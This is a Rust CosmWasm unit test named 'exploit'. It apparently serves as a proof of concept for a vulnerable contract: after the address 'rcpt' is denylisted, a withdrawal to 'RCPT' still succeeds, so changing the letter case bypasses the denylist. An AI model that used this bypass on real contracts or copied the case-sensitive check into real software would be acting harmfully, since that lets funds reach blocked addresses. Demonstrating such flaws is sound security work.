use super::*;
use crate::contract::{execute, instantiate};
use crate::msg::{ExecuteMsg, InstantiateMsg};
use cosmwasm_std::coins;
use cosmwasm_std::testing::{mock_dependencies, mock_env, mock_info};
use cosmwasm_std::Uint128;

#[test]
fn exploit() {
    let mut deps = mock_dependencies();
    let msg = InstantiateMsg {initial_deny: vec![]};
    let info = mock_info("creator", &coins(0, DENOM.to_string()));
    instantiate(deps.as_mut(), mock_env(), info, msg).unwrap();

    // Deposit funds
    let info = mock_info("alice", &coins(100, DENOM));
    let msg = ExecuteMsg::Deposit {};
    execute(deps.as_mut(), mock_env(), info, msg).unwrap();

    // Denylist rcpt
    let info = mock_info("creator", &[]);
    let msg = ExecuteMsg::AddToDenylist { address: "rcpt".to_string() };
    execute(deps.as_mut(), mock_env(), info, msg).unwrap();

    // Successful withdraw of funds
    let info = mock_info("alice", &[]);
    let msg = ExecuteMsg::Withdraw {
        amount: Uint128::from(100_u64),
        destination: Some("RCPT".to_string()),
    };
    execute(deps.as_mut(), mock_env(), info, msg).unwrap();
}
